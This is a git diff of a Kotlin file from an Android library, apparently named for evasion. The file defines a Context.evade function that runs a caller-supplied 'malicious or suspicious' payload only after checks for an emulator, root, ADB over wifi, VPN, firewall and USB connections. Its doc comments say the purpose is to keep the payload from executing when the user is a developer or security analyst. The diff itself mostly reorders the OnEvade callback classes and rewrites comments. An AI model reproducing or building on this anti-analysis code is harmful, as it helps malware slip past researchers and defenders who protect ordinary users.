@@ -1,4 +1,5 @@
-/*Copyright 2020 Chris Basinger
+/*
+Copyright 2020 Chris Basinger
 
 Licensed under the Apache License, Version 2.0 (the "License");
 you may not use this file except in compliance with the License.
@@ -32,7 +33,6 @@ import kotlinx.coroutines.async
 import kotlinx.coroutines.launch
 import java.net.NetworkInterface
 import javax.net.SocketFactory
-
 /*
             (   (                ) (             (     (
             )\ ))\ )    *   ) ( /( )\ )     (    )\ )  )\ )
@@ -53,29 +53,24 @@ import javax.net.SocketFactory
 ............\..............(
 ..............\.............\...
 */
-class OnEvade{
-    class Success(val result: Boolean): Result{
-        fun onSuccess(callback: () -> Unit): Escape{
-            if(this.result)
-                callback()
-            return Escape(this.result)
-        }
-    }
-    class Escape(val result: Boolean): Result{
-        fun onEscape(callback: () -> Unit): Success{
-            if(!this.result)
-                callback()
-            return Success(this.result)
-        }
-    }
-}
-
-interface Result
-/*This is a scoping functon for your payload. Write your malicious or suspicious code right here. The trailing lambda is then executed after we
-check multiple conditions regarding whether it is safe in regards to cyber security analysts. If you do not require networking capabilities with
-your payload please pass false as the argument as true is the default value. This will also return a callback for onEscape meaning it was not executed.
-Which immediately after you can register for a callback named onSuccess.*/
-//If we wanted to make this better we could check the state of the sim card(s) allowing us to evade device's without a sim card. However this will cause us to use a dangerous permission called READ_PHONE_STATE
+/**
+ * @author Chris Basinger
+ * @email evilthreads669966@gmail.com
+ * @date 10/09/20
+ *
+ * [Context.Evade] is an asynchronous higher order function that takes a trailing lambda which is safe from behavioural analysis. Before the trailing lambda argument's block of code is executed there are numerous checks that happen before
+ * deciding whether to execute your code. All of these checks are in place to make sure that the user of your application is not a developer, cyber security analyst, or network analyst.
+ * The evasion algorithm for checking whether it is safe runs the methods returning either false or true.
+ * [isEmulator], [isRooted], [hasAdbOverWifi], [isConnected], [hasVpn], [hasFirewall], [hasUsbDevices]
+ * All checks must return false in order for you block of code inside of the trailing lambda payload argument of [Context.evade] to run.
+ * [Context.evade] provides two callbacks: onEscape and onSuccess which are provided by [OnEvade.Escape] and [OnEvade.Success] Unfortunately for now you must call [onEscape] before
+ * calling [onSuccess] which means that chaining these callbacks in that respective order is requirement.
+ * You can bypass two evasion checks if you do not require networking by passing in false to the named argument [requiresNetwork]. Passing in false for [requiresNetwork]
+ * allows [Context.evade] to execute your trailing lambda payload without checking [hasFirewall] and [hasVpn].
+ * No dangerous permissions are required by this KTX function, so no permission requests are required. The required non-dangerous permissions are [Manifest.permission.INTERNET],
+ * [Manifest.permission.ACCESS_NETWORK_STATE], and [Manifest.permission.ACCESS_WIFI_STATE] will be merged into your app's Android.manifest file
+ * when compiling.
+ **/
 inline suspend fun Context.evade(scope: CoroutineScope, requiresNetwork: Boolean = true, crossinline payload: () -> Unit): OnEvade.Escape{
     val isEmulator = scope.async { isEmulator() }
     val isRooted = scope.async { isRooted() }
@@ -98,6 +93,25 @@ inline suspend fun Context.evade(scope: CoroutineScope, requiresNetwork: Boolean
     }
     return OnEvade.Escape(false)
 }
+
+class OnEvade{
+    class Success(val result: Boolean): Result{
+        fun onSuccess(callback: () -> Unit): Escape{
+            if(this.result)
+                callback()
+            return Escape(this.result)
+        }
+    }
+    class Escape(val result: Boolean): Result{
+        fun onEscape(callback: () -> Unit): Success{
+            if(!this.result)
+                callback()
+            return Success(this.result)
+        }
+    }
+}
+
+interface Result
 
 /*Checks whether this phone is connected to a usb device such as a computer. I do not know whether this works but I believe it won't hurt to check*/
 @RequiresApi(Build.VERSION_CODES.HONEYCOMB_MR1)
